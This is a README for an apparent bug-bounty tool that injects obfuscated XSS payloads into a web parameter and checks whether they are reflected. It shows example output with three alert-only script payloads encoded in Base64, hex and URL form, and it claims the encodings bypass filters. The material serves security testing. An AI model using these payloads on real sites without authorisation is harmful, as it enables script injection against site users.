# bug-bounty-xss-injector

This Python-based tool is designed for security researchers and bug bounty hunters to identify cross-site scripting (XSS) vulnerabilities in web applications. This script automates the process of injecting various obfuscated XSS payloads into a target web application and analyzes whether the payloads are reflected in the server response, indicating a possible XSS vulnerability.

**Automated XSS Testing** - The script automatically injects payloads into a specified parameter to test for XSS vulnerabilities. 

**Obfuscation Techniques** – Uses Base64, Hex, and URL encoding to bypass basic security filters.

**Reflection Detection** – Checks if the injected payload appears in the server's response, a key indicator of reflected XSS.

**Customizable Input** – Allows the user to specify the target URL, request method (GET/POST), and parameter name.

**Logging** – Saves test results, including detected reflections, into a log file for further analysis.

**Bug Bounty Friendly** – Includes an HTTP header field (BugBounty-Researcher) to identify the researcher when testing within responsible disclosure programs.

## Example Usage
```
Enter target URL: https://<your_targeted_web_application>
Enter your bug bounty email: <researcher_handle>@<your_bugbounty_researcher_email.com
Enter request method (GET/POST): GET
Enter parameter name (e.g., 'q', 'input'): q
```
## Example Output
```
[+] Payload reflected: <script>eval(atob('Jmx0O3NjcmlwdCZndDthbGVydCgnaW5qZWN0ZWQnKTsmbHQ7L3NjcmlwdCZndDs='));</script>
Response snippet:
<!DOCTYPE html>
<html
lang="en"
dir="ltr"
data-action="Search-Show"
data-querystring="q=%3Cscript%3Eeval(atob(&amp;#x27;Jmx0O3NjcmlwdCZndDthbGVydCgnaW5qZWN0ZWQnKTsmbHQ7L3NjcmlwdCZndDs%3D&amp;#x27;))%3B%3C%2Fscript%3E"   
data-siteid="THIS_HAS_BEEN_LEFT_OUT_FOR_CONFIDENTIAL_REASONS"
data-locale="en_US"
>
<head>
<meta charset="UTF-8"/>
----------------------------------------
[-] Payload not reflected: <script>eval('\x3c\x73\x63\x72\x3c\x73\x63\x72\x69\x70\x74\x3e\x69\x70\x74\x3e\x61\x6c\x65\x72\x74\x28\x27\x69\x6e\x6a\x65\x63\x74\x65\x64\x27\x29\x3b\x3c\x2f\x73\x63\x72\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e\x69\x70\x74\x3e');</script>
----------------------------------------
[+] Payload reflected: <script>window.location=decodeURIComponent('alert%28%27injected%27%29%3B');</script>
Response snippet:
<!DOCTYPE html>
<html
lang="en"
dir="ltr"
data-action="Search-Show"  
data-querystring="q=%3Cscript%3Ewindow.location%3DdecodeURIComponent(&amp;#x27;alert%2528%2527injected%2527%2529%253B&amp;#x27;)%3B%3C%2Fscript%3E"
data-siteid="THIS_HAS_BEEN_LEFT_OUT_FOR_CONFIDENTIAL_REASONS"
data-locale="en_US"
>
<head>
<meta charset="UTF-8"/>
```

## This tool is intended only for ethical hacking and responsible bug bounty research.  Do not use this tool on systems you do not own or have permission to test.
